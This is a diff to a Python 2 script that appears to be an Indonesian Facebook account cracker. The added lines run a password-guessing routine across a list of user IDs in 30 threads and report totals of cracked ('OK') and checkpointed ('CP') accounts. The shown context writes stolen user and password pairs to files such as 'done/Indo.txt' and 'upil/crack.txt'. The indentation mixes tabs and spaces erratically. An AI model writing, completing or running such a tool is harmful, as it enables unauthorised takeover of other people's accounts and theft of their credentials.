@@ -317,7 +317,21 @@ def pilih_passxd():
                                                                                 print '\x1b[0;32m   [OK] '+user+' • '+pass4+' • '+tl
                                                                                 oke = open('done/Indo.txt', 'a')
                                                                                 oke.write('\n[OK] '+
-	
+
+
+                except:
+                        pass   
+        p = ThreadPool(30)
+        p.map(main, id)
+        print 42*"\033[1;96m="
+        print ("\033[1;96m[•] \033[1;93mHasil Crack")
+        print "\033[1;96m[✓] \033[1;34mTotal OK : \033[1;34m"+str(len(oks))
+        print "\033[1;96m[✓] \033[1;93mTotal CP : \033[1;93m"+str(len(cekpoint))
+        print ("\033[1;96m[✓] \033[1;97mFile Tersimpan : \033[1;31mupil/crack.txt")
+        raw_input("\033[1;96m[ Kembali ]")
+        os.system("python2 fbc")
+	menu()
+
 def updatesc():
 	os.system("clear")
 	banner()
